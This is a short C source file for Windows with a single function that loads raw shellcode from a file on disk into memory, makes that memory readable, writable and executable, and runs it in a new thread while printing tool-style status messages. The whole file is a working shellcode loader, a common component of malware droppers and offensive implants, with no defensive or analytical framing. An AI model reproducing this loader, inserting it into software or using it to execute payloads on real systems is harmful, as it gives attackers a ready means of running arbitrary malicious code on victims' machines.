#include <Windows.h>


BOOL InjectShellcodeFileLocally(IN LPCWSTR wsShellFileName) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	dwBufferSize = NULL,
		dwNumberOfBytesRead = NULL,
		dwOldProtection = NULL;
	PBYTE	pBufferData = NULL;

	BOOL	bResults = FALSE;

	if ((hFile = CreateFileW(wsShellFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((dwBufferSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((pBufferData = VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pBufferData, dwBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwBufferSize) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Read: %d of %d\n", dwNumberOfBytesRead, dwBufferSize);
		goto _EndOfFunc;
	}

	if (!VirtualProtect(pBufferData, dwBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	printf("\t[-] Running Shellcode Payload via Thread ");
	DWORD	dwThreadId = 0x00;
	HANDLE	hThread = CreateThread(NULL, NULL, pBufferData, NULL, NULL, &dwThreadId);
	printf("[ %d ] ... \n", dwThreadId);
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
	}

	bResults = TRUE;

_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResults;
}